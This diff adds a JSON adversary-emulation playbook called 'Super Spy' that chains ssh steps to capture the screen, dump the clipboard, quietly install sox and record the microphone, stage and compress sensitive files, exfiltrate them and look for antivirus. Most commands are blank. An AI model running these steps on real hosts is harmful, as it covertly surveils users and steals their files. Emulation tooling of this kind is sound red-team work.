@@ -1,0 +1,170 @@
+{
+    "id": "Playbook UUID-002",
+    "name": "Super Spy",
+    "description": "Playbook Implementing Cacao Profile: Super Spy",
+    "playbook_variables": {
+        "$$host.file.path$$": {"type": "string"},
+        "$$host.dir.staged$$": {"type": "string"},
+        "$$host.dir.compress$$": {"type": "string"}
+    },
+    "workflow_start": "step-uuid001",
+    "workflow": {
+        "step-uuid001": {
+            "type": "start",
+            "name": "Start Step",
+            "description": "Start the Operation",
+            "on_completion": "step-uuid002"
+        },
+        "step-uuid002": {
+            "type": "single",
+            "name": "Screen Capture",
+            "description": "capture the contents of the screen",
+            "timeout": 60,
+            "on_completion": "step-uuid003",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "" 
+                }
+            ]
+        },
+        "step-uuid003": {
+            "type": "single",
+            "name": "Copy Clipboard",
+            "description": "copy the contents for the clipboard and print them",
+            "timeout": 60,
+            "on_completion": "step-uuid004",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "pbpaste" 
+                }
+            ]
+        },
+        "step-uuid004": {
+            "type": "single",
+            "name": "Get Chrome Bookmarks",
+            "description": "Get Chrome Bookmarks",
+            "timeout": 60,
+            "on_completion": "step-uuid005",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "" 
+                }
+            ]
+        },
+        "step-uuid005": {
+            "type": "single",
+            "name": "Record microphone",
+            "description": "Install sox and record microphone for n-seconds",
+            "timeout": 120,
+            "on_completion": "step-uuid006",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "brew install sox >/dev/null 2>&1; sox -d recording.wav trim 0 15 >/dev/null 2>&1;"
+                }
+            ]
+        },
+        "step-uuid006": {
+            "type": "single",
+            "name": "Create staging directory",
+            "description": "create a directory for exfil staging",
+            "timeout": 60,
+            "on_completion": "step-uuid007",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "mkdir -p staged && echo $PWD/staged"
+                }
+            ]
+        },
+        "step-uuid007": {
+            "type": "single",
+            "name": "Find files",
+            "description": "Locate files deemed sensitive",
+            "timeout": 60,
+            "on_completion": "step-uuid008",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": ""
+                }
+            ]
+        },
+        "step-uuid008": {
+            "type": "single",
+            "name": "Stage sensitive files",
+            "description": "copy files to staging directory",
+            "timeout": 60,
+            "on_completion": "step-uuid009",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}"
+                }
+            ],
+            "in_args": ["$$host.file.path$$", "$$host.dir.staged$$"]
+        },
+        "step-uuid009": {
+            "type": "single",
+            "name": "Compress staged directory",
+            "description": "Compress a directory on the file system",
+            "timeout": 60,
+            "on_completion": "step-uuid010",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": ""
+                }
+            ],
+            "in_args": ["$$host.dir.staged$$"]
+        },
+        "step-uuid010": {
+            "type": "single",
+            "name": "Exfil staged directory",
+            "description": "Exfil the staged directory",
+            "timeout": 60,
+            "on_completion": "step-uuid011",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": ""
+                }
+            ],
+            "in_args": ["$$host.dir.compress$$"]
+        },
+        "step-uuid011": {
+            "type": "single",
+            "name": "Find files",
+            "description": "Locate files deemed sensitive",
+            "timeout": 60,
+            "on_completion": "step-uuid012",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": ""
+                }
+            ]
+        },
+        "step-uuid012": {
+            "type": "single",
+            "name": "Discover antivirus programs",
+            "description": "Identify AV",
+            "timeout": 60,
+            "on_completion": "step-uuid013",
+            "commands": [
+                {
+                    "type": "ssh",
+                    "command": ""
+                }
+            ]
+        },
+        "step-uuid013": {
+            "type": "end",
+            "name": "End Step",
+            "description": "Final step for playbook"
+        }
+    }
+}
